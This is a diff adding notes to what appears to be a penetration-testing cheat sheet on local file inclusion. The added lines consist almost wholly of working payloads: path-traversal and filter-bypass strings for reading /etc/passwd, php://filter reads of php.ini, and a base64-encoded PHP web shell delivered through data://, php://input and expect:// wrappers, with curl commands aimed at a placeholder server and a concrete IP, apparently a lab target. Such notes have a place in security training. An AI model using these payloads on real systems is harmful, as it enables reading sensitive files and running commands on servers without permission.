@@ -450,6 +450,33 @@ LFI
 3- if found id=http://www.burpcollaborator.com
 	- can make base64 for ==> #echo "https://www.burpcollborator.com" | base64 
 	- taking the base64 and put it after id=aHR0cDovL3d3dy5nb29nbGUuY29t
+lang=../../../../../../../../../etc/passwd
+lang=....//....//....//....//etc/passwd
+lang=..././..././..././..././etc/passwd
+lang=...\/...\/...\/...\/etc/passwd
+use encoding = double encoding = trible encoding 
+/etc/passwd/.
+////etc/passwd
+/etc/./passwd
+///etc/passwd	=> for linux 
+echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+
+/etc/passwd%00
+/etc/passwd%00.php
+
+try to use 
+step 1 	- 		?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" 
+base64 deconding 
+if found (( allow_url_include=on))
+then you can include data and rce 
+use # echo '<?php system($_GET["cmd"]); ?>' | base64		==> PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8
+?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+you will know the id and any other command 
+$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+$ curl -s -X POST --data '<?php system("id") ?>' "http://167.172.54.11:30582/index.php?language=php://input" | grep uid
+repeating step one to see if found (( expect ))  in config file 
+after that use 
+#curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 
 
 
